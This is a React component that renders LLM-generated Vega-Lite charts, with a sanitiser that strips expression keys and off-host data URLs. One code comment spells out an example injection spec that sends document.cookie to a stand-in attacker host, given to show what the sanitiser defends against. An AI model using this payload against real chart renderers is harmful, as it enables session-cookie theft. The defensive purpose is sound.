"use client";

/**
 * Vega-Lite chart renderer. Uses `react-vega` (added to package.json) when
 * present; falls back to a JSON preview when the package is not available
 * (e.g. during initial install).
 *
 * Defence-in-depth: every spec is JSON-stringified through a stripper
 * that removes `signal:` expressions and `url:` data references that
 * point off the host origin — the two known Vega-Lite injection vectors.
 */

import { useMemo, useEffect, useState, type ReactNode } from "react";
import type { ChartSpec } from "@/core/brain/generative-ui/types";
import { SourceTrail } from "./SourceTrail";
import { tryOptionalImport } from "./_shared";

interface Props {
  spec: ChartSpec;
}

export default function ChartVegaLite({ spec }: Props) {
  const sanitisedSpec = useMemo(() => sanitiseVegaLite(spec.spec), [spec.spec]);
  const [VegaLiteComponent, setVegaLiteComponent] =
    useState<React.ComponentType<{
      spec: Record<string, unknown>;
      actions?: boolean;
    }> | null>(null);

  useEffect(() => {
    let cancelled = false;
    // Dynamic import keeps react-vega out of the SSR bundle and degrades
    // gracefully when the package isn't installed yet.
    tryOptionalImport<{ VegaLite?: React.ComponentType<unknown> }>(
      "react-vega",
    ).then((mod) => {
      if (!cancelled && mod && mod.VegaLite) {
        setVegaLiteComponent(
          () =>
            mod.VegaLite as React.ComponentType<{
              spec: Record<string, unknown>;
              actions?: boolean;
            }>,
        );
      }
    });
    return () => {
      cancelled = true;
    };
  }, []);

  const ariaLabel = spec.ariaLabel ?? spec.title ?? "Vega-Lite chart";

  return (
    <figure
      role="figure"
      aria-label={ariaLabel}
      className="my-3 rounded-lg border border-slate-200 bg-white p-4"
    >
      {spec.title ? (
        <figcaption className="mb-2 text-sm font-medium text-slate-800">
          {spec.title}
        </figcaption>
      ) : null}
      {VegaLiteComponent ? (
        renderVegaLite(VegaLiteComponent, sanitisedSpec)
      ) : (
        <VegaLiteFallback spec={sanitisedSpec} />
      )}
      <SourceTrail {...(spec.source ?? {})} />
    </figure>
  );
}

function renderVegaLite(
  Component: React.ComponentType<{
    spec: Record<string, unknown>;
    actions?: boolean;
  }>,
  spec: Record<string, unknown>,
): ReactNode {
  return <Component spec={spec} actions={false} />;
}

function VegaLiteFallback({ spec }: { spec: Record<string, unknown> }) {
  return (
    <pre className="overflow-x-auto rounded bg-slate-50 p-3 text-xs text-slate-700">
      {JSON.stringify(spec, null, 2)}
    </pre>
  );
}

/**
 * Strip Vega-Lite injection vectors (ported from Borjie PR #96 C2):
 *
 *   - `signal`     — Vega's primary expression language vector
 *   - `expr`       — `params[].expr`, `transform[].calculate.expr` etc.
 *   - `calculate`  — `transform[].calculate` runs an expression
 *   - `update`     — `signal.on[].update` runs on every event
 *   - `init`       — `signal.init` evaluates at chart bootstrap
 *   - `params`     — top-level params can carry arbitrary `expr` strings;
 *                    stripped wholesale to prevent param-binding-driven RCE
 *
 * Plus:
 *   - `url` keys that reference off-host data (Borjie-original guard)
 *   - Any function-valued field (defence-in-depth; JSON never produces fns)
 *
 * Without this strip an LLM-emitted spec like
 *   `{"params":[{"name":"x","expr":"window.location='https://atk/?c='+document.cookie"}]}`
 * would run arbitrary JS in the admin browser session at vega-embed time.
 */
const VEGA_EXPRESSION_KEYS = new Set([
  "signal",
  "expr",
  "calculate",
  "update",
  "init",
  "params",
]);

function sanitiseVegaLite(
  input: Record<string, unknown>,
): Record<string, unknown> {
  return stripNode(input) as Record<string, unknown>;
}

function stripNode(node: unknown): unknown {
  if (Array.isArray(node)) {
    return node.map(stripNode);
  }
  if (node && typeof node === "object") {
    const out: Record<string, unknown> = {};
    for (const [key, value] of Object.entries(
      node as Record<string, unknown>,
    )) {
      if (VEGA_EXPRESSION_KEYS.has(key)) continue;
      if (typeof value === "function") continue;
      if (key === "url" && typeof value === "string") {
        if (
          !value.startsWith("/") &&
          !value.startsWith(window?.location?.origin ?? "")
        ) {
          continue;
        }
      }
      out[key] = stripNode(value);
    }
    return out;
  }
  return node;
}
